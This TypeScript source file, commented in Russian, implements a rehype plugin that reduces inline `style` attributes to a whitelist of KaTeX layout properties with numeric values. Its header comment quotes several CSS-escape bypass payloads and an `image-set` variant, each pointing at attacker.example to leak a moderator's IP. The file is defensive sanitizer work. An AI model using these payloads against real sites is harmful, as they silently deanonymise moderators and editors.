import type { Root } from 'hast';

// Схема санитайзера (markdownSanitizeSchema.ts) обязана разрешать `style` на
// span/svg/mstyle: инлайновые стили — это вся вёрстка KaTeX, без них формула
// рассыпается. Но санитайзер проверяет только *имя* атрибута, не значение,
// поэтому `style` читателя приезжает в браузер модератора как есть.
//
// Опасен там не код (его в CSS нет), а сетевой запрос: любое
// `background:url(https://attacker.example/x.png)` заставляет браузер
// модератора сходить на выбранный читателем хост и утечь ему IP и Referer
// читальни — деанонимизация редактора без единого клика. Читальня
// сознательно не хранит IP читателей; отдавать наружу адрес редактора,
// который в эту сделку не входил, тем более нельзя.
//
// Прошлая версия этого файла (rehypeStripStyleUrls) была ЧЁРНЫМ списком:
// удаляла `style`, если значение матчилось на /url\s*\(|@import/i. Обходится
// экранами CSS — и это не дырка в регулярке, а устройство токенизатора:
// по CSS Syntax Level 3 escape-последовательности в ident-token
// раскрываются ДО сравнения с «url», так что браузер видит настоящий
// `url()` там, где регулярка его не видит. Замеряно на живом конвейере,
// протекали все четыре:
//
//     background:\75rl(https://attacker.example/x.png)     \75 -> u
//     background:u\72l(https://attacker.example/x.png)     \72 -> r
//     background:ur\6c(https://attacker.example/x.png)     \6c -> l
//     background:\75 rl(https://attacker.example/x.png)    экран + пробел
//
// а сверх них — `background-image:image-set("https://…" 1x)`, где токена
// `url(` нет вовсе, и запрос всё равно уходит. Перечислять способы записать
// загрузку ресурса в CSS — гонка, которую не выиграть.
//
// Поэтому логика перевёрнута: БЕЛЫЙ список того, что KaTeX действительно
// выдаёт, всё прочее выбрасывается. Ключевой факт, делающий это возможным:
// инлайновые стили KaTeX — числа. Длины и (в одном месте) имя цвета на
// коротком наборе свойств вёрстки. Список ниже снят замером, а не памятью:
// 76 формул (дроби, радикалы включая \sqrt[3], матрицы и array, суммы и
// интегралы с пределами, \underbrace/\overbrace, \text, составные акценты,
// \boxed, \cancel, \phantom, \color, \rule, \left…\right) прогнаны через
// настоящий конвейер remark-math -> rehype-katex, у 903 узлов со `style`
// собраны все встреченные декларации. Подробности и полная таблица — в
// task-11-report.md, «Fix round 4».
//
// Значение перебирается по декларациям, и результат СОБИРАЕТСЯ ЗАНОВО из
// тех, что прошли проверку. Это принципиально: непонятый обрывок не может
// уцелеть «между» декларациями, что бы там ни думал токенизатор CSS о
// кавычках, комментариях и экранах внутри него.

// Длина: только число с необязательной единицей. Экраны (`\75`), скобки,
// кавычки, запятые сюда не проходят по построению — именно на этом, а не на
// списке свойств, держится безопасность фильтра.
const LENGTH = /^-?(?:\d+(?:\.\d+)?|\.\d+)(?:em|ex|rem|px|pt|%)?$/;

// Цвет: имя (`transparent` от \phantom, `red`/`blue` от \color) или hex.
// Ни одна форма записи цвета в CSS не умеет тянуть ресурс из сети;
// функциональные записи (rgb(), var(), color-mix()) не проходят — в них есть
// скобки.
const COLOR = /^(?:#[0-9a-f]{3,8}|[a-z]+)$/i;

type ValueCheck = (value: string) => boolean;

const length: ValueCheck = (value) => LENGTH.test(value);

const lengthList =
  (min: number, max: number): ValueCheck =>
  (value) => {
    const parts = value.split(/\s+/).filter(Boolean);
    return parts.length >= min && parts.length <= max && parts.every((p) => LENGTH.test(p));
  };

const keywords =
  (...allowed: string[]): ValueCheck =>
  (value) =>
    allowed.includes(value.toLowerCase());

const color: ValueCheck = (value) => COLOR.test(value);

/**
 * Свойства, которые KaTeX реально выдаёт в инлайновом `style`, и допустимая
 * форма значения каждого. Замер (76 формул): height, top, vertical-align,
 * margin-right — тысячи вхождений; left, width, min-width, margin-left,
 * padding-left, bottom, border-*-width, border-style, position:relative,
 * color, margin (`0 -0.02em`), text-shadow (`0.02em 0.01em 0.04px`, от
 * \pmb) — единицы.
 *
 * Сверх замеренного добавлены парные стороны тех же box-семейств
 * (margin-top/-bottom, padding-*, right, border-left-*) — осознанное
 * расширение, чтобы патч-версия KaTeX, поставившая отступ с другой стороны,
 * не рассыпала вёрстку формул молча. Расширение бесплатно: проверку
 * проходит только числовая длина, а числом ресурс из сети не вытянуть.
 */
const ALLOWED_PROPERTIES = new Map<string, ValueCheck>([
  // положение и размеры (замерено)
  ['height', length],
  ['width', length],
  ['min-width', length],
  ['top', length],
  ['bottom', length],
  ['left', length],
  ['right', length], // парное к left
  ['vertical-align', length],
  ['position', keywords('relative')],
  // отступы (замерено: margin, margin-left, margin-right, padding-left)
  ['margin', lengthList(1, 4)],
  ['margin-left', length],
  ['margin-right', length],
  ['margin-top', length], // парные
  ['margin-bottom', length],
  ['padding', lengthList(1, 4)],
  ['padding-left', length],
  ['padding-right', length], // парные
  ['padding-top', length],
  ['padding-bottom', length],
  // рамки: \boxed, \fbox, \overline, черта дроби, \hline в array
  ['border-width', length],
  ['border-top-width', length],
  ['border-bottom-width', length],
  ['border-right-width', length],
  ['border-left-width', length], // парное
  ['border-style', keywords('solid')],
  ['border-right-style', keywords('solid')],
  ['border-left-style', keywords('solid')], // парные
  ['border-top-style', keywords('solid')],
  ['border-bottom-style', keywords('solid')],
  // цвет: transparent у \phantom, имя/hex у \color и \textcolor
  ['color', color],
  // \pmb рисует «жирный» тенью из трёх длин
  ['text-shadow', lengthList(2, 3)],
]);

// Страховка на будущее: даже если кто-то однажды добавит в карту выше
// проверку пошире, чем нужно, готовая декларация не должна нести ни одного
// символа, которым в CSS открывается функция, строка, комментарий или
// экран. Дешёвый последний рубеж, он же — явно записанный инвариант.
const FORBIDDEN_IN_OUTPUT = /[\\("'/*;{}@!<>]/;

/**
 * Оставляет в значении `style` только понятые декларации и собирает строку
 * заново. Возвращает пустую строку, если не осталось ничего.
 */
export function filterStyleValue(value: string): string {
  const kept: string[] = [];

  for (const declaration of value.split(';')) {
    const raw = declaration.trim();
    if (!raw) continue;

    const colonAt = raw.indexOf(':');
    if (colonAt < 1) continue;

    const property = raw.slice(0, colonAt).trim().toLowerCase();
    const propertyValue = raw.slice(colonAt + 1).trim();

    // Имя свойства тоже ident-token, и экраны в нём раскрываются так же
    // (`\62ackground` — это `background`). Ни одно свойство KaTeX не
    // содержит ничего, кроме букв и дефиса.
    if (!/^[a-z][a-z-]*$/.test(property)) continue;

    const check = ALLOWED_PROPERTIES.get(property);
    if (!check || !propertyValue || !check(propertyValue)) continue;

    const rebuilt = `${property}:${propertyValue}`;
    if (FORBIDDEN_IN_OUTPUT.test(rebuilt)) continue;

    kept.push(rebuilt);
  }

  return kept.join(';');
}

// Структурный тип пошире, чем hast'овский `ElementContent`: `rehype-raw`
// доклеивает через module augmentation свой тип узла `Doctype`, и строгий
// союз не покрывает всё, что этот обход реально проходит. Нужны только
// «есть ли дети» и «есть ли свойства» — оба необязательны.
interface WalkableNode {
  type: string;
  properties?: Record<string, unknown>;
  children?: WalkableNode[];
}

function walk(node: WalkableNode) {
  if (node.type === 'element' && node.properties) {
    const style = node.properties.style;
    if (typeof style === 'string') {
      const filtered = filterStyleValue(style);
      if (filtered) {
        node.properties.style = filtered;
      } else {
        delete node.properties.style;
      }
    } else if (style !== undefined) {
      // `style` не строка — в hast такого от нашего конвейера не бывает,
      // но пропускать неизвестное значение дальше незачем.
      delete node.properties.style;
    }
  }
  node.children?.forEach(walk);
}

/**
 * rehype-плагин: приводит все инлайновые `style` к белому списку вёрстки
 * KaTeX. Ставится ПОСЛЕ rehype-sanitize — ему достаточно видеть то, что
 * схема уже пропустила по имени атрибута.
 */
export function rehypeAllowlistStyles() {
  return (tree: Root) => {
    walk(tree as unknown as WalkableNode);
  };
}
